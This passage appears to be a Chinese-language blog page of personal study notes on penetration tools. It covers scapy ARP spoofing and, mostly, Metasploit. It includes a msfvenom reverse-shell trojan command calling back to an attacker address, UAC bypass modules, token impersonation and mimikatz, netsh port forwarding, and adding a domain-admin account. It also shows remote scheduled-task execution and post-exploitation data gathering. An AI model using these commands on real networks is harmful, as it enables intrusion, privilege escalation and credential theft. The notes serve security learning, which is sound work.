+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-13.png" srcset="/img/loading.gif" lazyload alt="image-20220203191845601"></p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>操作系统识别:可以使用ping的TTL来识别,不过可能会被伪装,&lt;64的操作系统是Linux或者unix反之则是Windows</p>
+<p>异步嗅探:</p>
+<p>AsyncSniffer使用这个来代替sniff就可以了参数和sniff一样</p>
+<h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p>ARP：地址解析协议用来通知网络我是谁</p>
+<p>原理是让受害机认为我是网关，让网关认为我是受害机</p>
+<p>关于scapy的ARP包</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-14.png" srcset="/img/loading.gif" lazyload alt="image-20220307165322717"></p>
+<blockquote>
+<p>op 为1代表请求,为2代表响应</p>
+<p>hwsrc 发送方的MAC地址</p>
+<p>psrc    发送方的ip</p>
+<p>hwdst 目标的MAC</p>
+<p>pdst    目标的IP</p>
+</blockquote>
+<h2 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h2><p>远程桌面连接软件</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cunjiu9486/article/details/109073104">https://blog.csdn.net/cunjiu9486/article/details/109073104</a></p>
+<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><h3 id="常用的功能模块"><a href="#常用的功能模块" class="headerlink" title="常用的功能模块"></a><strong>常用的功能模块</strong></h3><p>模块在kali的位置</p>
+<blockquote>
+<p>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;scripts&#x2F;meterpreter</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>模块名称</th>
+<th>模块作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Auxiliary</td>
+<td>负责执行信息收集，扫描，嗅探，指纹识别，口令猜测和Dos攻击等功能的辅助模块</td>
+</tr>
+<tr>
+<td>Exploits</td>
+<td>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动，被动）</td>
+</tr>
+<tr>
+<td>Payloads</td>
+<td>成功exploit之后，真正在目标系统执行的代码和命令。</td>
+</tr>
+<tr>
+<td>Post</td>
+<td>后期渗透模块，在取得目标系统远程控制权后吗，进行一系列的后渗透攻击动作，如获取敏感信息，跳板攻击等操作。</td>
+</tr>
+<tr>
+<td>Encoders</td>
+<td>对payload进行加密，躲避antiviru检查的模块。</td>
+</tr>
+<tr>
+<td>Nops</td>
+<td>提高payload稳定性及维持大小，在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化，返回地址计算偏差等原因造成的shellcode执行失败，提高渗透攻击的可靠性。</td>
+</tr>
+</tbody></table>
+<p>升级msf</p>
+<blockquote>
+<p>apt update</p>
+</blockquote>
+<p>MSFDB</p>
+<blockquote>
+<p>msfdb init       # start and initialize the database  postgresql<br>msfdb reinit    # delete and reinitialize the database<br>msfdb delete  # delete database and stop using it<br>msfdb start     # start the database<br>msfdb stop     # stop the database<br>msfdb status   # check service status<br>msfdb run       # start the database and run msfconsole</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>help或者？</th>
+<th>显示msfconsole可以使用的命令。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>connect</td>
+<td>可以理解为MSF中的nc命令，可以使用connect -h查看详细用法。</td>
+</tr>
+<tr>
+<td>show</td>
+<td>可以查看msf提供的资源。在根目录下执行的话，由于有些资源模块比较多，需要执行show命令较长的时间。show exploits：查看可以使用的exploit。除了exploits，还支持all，encoders，nops，payloads，auxiliary，post，options。有些选项需要用use使用一个模块后才能使用，show targets。</td>
+</tr>
+<tr>
+<td>search</td>
+<td>搜索模块简单搜索：search ms17_010。多条件搜素缩小范围：search name:mysql type:exploit platform:linux</td>
+</tr>
+<tr>
+<td>info</td>
+<td>查看模块信息info <module name>如果用use使用了一个模块，直接输入info查看。</module></td>
+</tr>
+<tr>
+<td>use</td>
+<td>search找到模块后，用use使用模块use exploit&#x2F;windows&#x2F;smb&#x2F;mso8_067_netapi用use使用一个模块后，可以使用show options查看我们需要配置的选项，使用show targets选择目标主机系统，使用show payload选择payload。</td>
+</tr>
+<tr>
+<td>set&#x2F;setg</td>
+<td>设置参数，比如要渗透的主机ip，payload等 ，我们可以使用show missing查看没有设置的参数。setg是设置全局变量，避免每个模块都要输入相同参数</td>
+</tr>
+<tr>
+<td>unset&#x2F;unsetg</td>
+<td>取消设置参数和取消设置的全局变量</td>
+</tr>
+<tr>
+<td>save</td>
+<td>设置的此参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。</td>
+</tr>
+<tr>
+<td>check</td>
+<td>检查模块是否真的存在这个漏洞，大部分模块没有check功能</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>back</th>
+<th>返回msfcomsole根目录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>run&#x2F;exploit</td>
+<td>开始使用模块exploit -j：以后台进行运行</td>
+</tr>
+<tr>
+<td>sessions</td>
+<td>查看当前以建立的sessions，说明已经拿到了shellsessions -i id 可以进入一个session交互</td>
+</tr>
+<tr>
+<td>load&#x2F;unload</td>
+<td>调用外部的扫描命令，比如openvas</td>
+</tr>
+<tr>
+<td>loadpath</td>
+<td>加载自己的模块</td>
+</tr>
+<tr>
+<td>route</td>
+<td>添加一条路由，比如发往某个子网的流量都通过攻陷的机器发送。</td>
+</tr>
+</tbody></table>
+<p>获取到的肉鸡下面运行的命令如下:</p>
+<ul>
+<li><p>run</p>
+<ul>
+<li>get_local_subnets:搜集内网信息</li>
+<li>autoroute -s 内网ip&#x2F;子网掩码长度:将肉鸡添加路由内网的功能<ul>
+<li>-p 查看路由表情况</li>
+</ul>
+</li>
+<li>post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;内网ip&#x2F;子网掩码长度    &#x3D;&#x3D;是RHOSTS不是RHOST&#x3D;&#x3D;:扫描内网</li>
+</ul>
+</li>
+<li><p>portfwd flush:应该是清除设置</p>
+<ul>
+<li><p>portfwd add -L 黑客ip -l 黑客的端口 -p 内网的某些来向端口 -r 内网的某台计算机的ip</p>
+<ul>
+<li><blockquote>
+<p>portfwd add -L 192.168.43.185 -l 2020 -p 80 -r 172.10.10.1</p>
+<p>这句话的意思是将172.10.10.1:80的数据转发到192.168.43.185:2020</p>
+<p>访问192.168.43.185:2020就直接跳转到172.10.10.1:80上面了</p>
+</blockquote>
+</li>
+<li><p><strong>这条命令可以当作给肉鸡添加路由表</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>socket代理:承接上面的当我们设置了内网服务器为跳板的时候（metasploit已经进入内网了，需要将他设置为跳板让别的软件也能访问内网）</p>
+<ul>
+<li><p>use auxiliary&#x2F;server&#x2F;socks_proxy：使用代理模块</p>
+</li>
+<li><p>set srvhost 127.0.0.1：设置本机代理</p>
+</li>
+<li><p>set srvport 40004：设置本机端口</p>
+</li>
+<li><p>set version 4a：设置代理版本</p>
+</li>
+<li><p>run：启用代理</p>
+</li>
+<li><p>jobs：查看启动是否成功</p>
+</li>
+<li><p>vim &#x2F;etc&#x2F;proxychains4.conf修改代理文件</p>
+</li>
+<li><p>[ProxyList]下面添加socks4 127.0.0.1 40004(IP 和端口号改成自己的),并且proxy_dns注释掉</p>
+</li>
+<li><p>接下来就可以使用了</p>
+</li>
+<li><p>proxychains 命令</p>
+<ul>
+<li><blockquote>
+<p>例如</p>
+<p>proxychains nmap “<a target="_blank" rel="noopener" href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a></p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>netsh进行msf的代理</p>
+<p>假设当前网络为这样</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E5%86%85%E7%BD%91-1.png" srcset="/img/loading.gif" lazyload alt="image-20220219163859692"></p>
+<p>黑客(kali)                                                           Windows    1                                             Windows 2</p>
+<p>生成一个木马脚本</p>
+<blockquote>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.140 lport&#x3D;4455 -f exe &gt; aaa.exe</p>
+<p>msfconsole</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 192.168.1.186</p>
+<p>set lport 4455</p>
+<p>exploit</p>
+<p>获取之后可以使用background返回上一层</p>
+</blockquote>
+<p>然后在Windows1上面设置</p>
+<blockquote>
+<p>netsh interface portproxy add v4tov4 listenport&#x3D;4455 connectaddress&#x3D;192.168.1.186 connectport&#x3D;4455</p>
+</blockquote>
+<p>设置完成后Windows2上面如果运行了攻击脚本则会获取shell</p>
+<h3 id="uac提权"><a href="#uac提权" class="headerlink" title="uac提权"></a>uac提权</h3><p>控制了肉鸡以后</p>
+<blockquote>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</p>
+<p>set session 1(设置成被控制的那个肉鸡)</p>
+<p>run</p>
+<p>之后要求用户机那边输入用户名和密码</p>
+</blockquote>
+<p>和上面那个一样</p>
+<blockquote>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p>
+<p>set session 1</p>
+<p>run</p>
+</blockquote>
+<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><blockquote>
+<p>以下的命令是进入控制肉鸡之后输入的</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E5%86%85%E7%BD%91-2.png" srcset="/img/loading.gif" lazyload alt="image-20220220140740957"></p>
+<p>也就是上面图片的那个模式</p>
+</blockquote>
+<p>use incognito</p>
+<p>list_tokens -u(能看到的令牌数量因权限决定)</p>
+<p>然后会显示类似如下的信息<br><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E5%86%85%E7%BD%91-3.png" srcset="/img/loading.gif" lazyload alt="image-20220220140421802"></p>
+<p>上面的Delegation Tokens是可以登录的下面的是不可以登录的</p>
+<p>假冒令牌:</p>
+<p>impersonate_token (上面的可登录的用户如:TEST1\\user1)</p>
+<p><strong>题外话</strong></p>
+<p>load mimikatz</p>
+<p>kerberos_ticket_list列出登录信息?</p>
+<p>kerberos_ticket_use</p>
+<p>ps查看进程</p>
+<p>如果有管理员没退出,残留了一些进程我们尝试进入那个进程从而获取他的权限</p>
+<p>操作方法如下:</p>
+<p>migrate PID</p>
+<blockquote>
+<p>当拿到域控管理员的时候我们可以添加一个用户</p>
+<p>add_user 用户名 密码 -h 域控服务器的ip地址</p>
+</blockquote>
+<blockquote>
+<p>添加用户到组从而提权</p>
+<p>add_group_user “domain admins” 用户名 -h 域控制器的ip地址</p>
+</blockquote>
+<p>&#x3D;&#x3D;<strong>下面的命令是Windows中使用的</strong>&#x3D;&#x3D;</p>
+<p>当我们添加完毕之后如果域控的服务器开启着c盘的共享</p>
+<p>我们使用</p>
+<blockquote>
+<p>net use \\域控的ip\c$ “密码” &#x2F;user:用户名</p>
+</blockquote>
+<p>然后就可以访问到目标的c盘了,如果对方开启了135,445端口可是使用如下的命令</p>
+<blockquote>
+<p>net use \\域控的ip\ipc$ “密码” &#x2F;user:用户名</p>
+</blockquote>
+<p>远程访问进程</p>
+<blockquote>
+<p>tasklist &#x2F;S ip &#x2F;U 用户名 &#x2F;P 密码</p>
+</blockquote>
+<p>设置计划任务</p>
+<blockquote>
+<p>at \\ip 时间(例如:9:51PM) cmd.exe “执行命令”</p>
+<p>schtasks &#x2F;create &#x2F;s IP地址 &#x2F;tn test1 &#x2F;sc onstart &#x2F;tr c:&#x2F;a.bat &#x2F;ru system &#x2F;f       (这条命令的意思是运行c下的a.bat)</p>
+</blockquote>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>1.UAC需要用户身份认证的</p>
+<p>2.使用绕过uac提权</p>
+<p>3.寻找操作系统是否有本地溢出的漏洞</p>
+<p>第一种方法</p>
+<blockquote>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p>
+<p>set filename QQ.exe #设置文件名</p>
+<p>set sessions #查看获取用户的session号</p>
+<p>set session 7</p>
+<p>exploit #当用户点击确定之后便成功</p>
+<p>sessions -i 7</p>
+<p>getsystem</p>
+</blockquote>
+<p>第二种方法</p>
+<p>UAC绕过</p>
+<blockquote>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</p>
+<p>set sessions</p>
+<p>set session 9</p>
+<p>sessions -i 9</p>
+<p>exploit</p>
+<p>getuid      #查看提权是否成功不成功的话使用getsystem尝试</p>
+</blockquote>
+<p>第三种方法</p>
+<p>查询Windows提权漏洞</p>
+<p>例如ms16_016</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>进入session之后</p>
+<blockquote>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;checkvm #检查是否是虚拟机</p>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #获取驱动器</p>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;enum_services #查看运行的服务</p>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #列出安装的应用</p>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;enum_share #查看是否存在共享</p>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;dumplinks #搜集内网的其他信息</p>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #查看存在的补丁</p>
+<p>run scraper #自动获取信息(脚本)</p>
+<p>run winenum #获取Windows操作系统的信息(脚本)</p>
+</blockquote>
+<p><strong>数据包获取</strong></p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/sniffer.png" srcset="/img/loading.gif" lazyload alt="image-20220227134412878"></p>
+<blockquote>
+<p>load sniffer #加载sniffer</p>
+<p>help #查看获取的命令</p>
+<p>由于抓取的包会存在内存中而不是放入硬盘所以一般一次只能抓取5万个包,所以要经常来下载包</p>
+<p>使用sniffer_dump来获取信息      sniffer_dump 文件名</p>
+<p>然后使用wireshark来数据包的分析或者使用auxiliary&#x2F;sniffer&#x2F;psnuffle</p>
+<p>使用auxiliary&#x2F;sniffer&#x2F;psnuffle方式来解析</p>
+<p>use auxiliary&#x2F;sniffer&#x2F;psnuffle</p>
+<p>set pcapfile 文件位置</p>
+<p>或者使用packetrecorder 来获取数据包</p>
+<p>在session里 run packetrecorder [参数]</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8/" class="category-chain-item">安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8/">#安全</a>
+      
+        <a href="/tags/tools/">#tools</a>
+      
+        <a href="/tags/nmap/">#nmap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>tools help</div>
+      <div>http://example.com/2022/01/22/tools-help/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/02/05/docker/" title="docker">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">docker</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞">
+                        <span class="hidden-mobile">命令执行漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.0/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"mPhovhHHyKg2LpAcQhS6tjAw-gzGzoHsz","appKey":"6W2dsSWjVfMOOkXrNbFWOSDN","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://mphovhhh.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
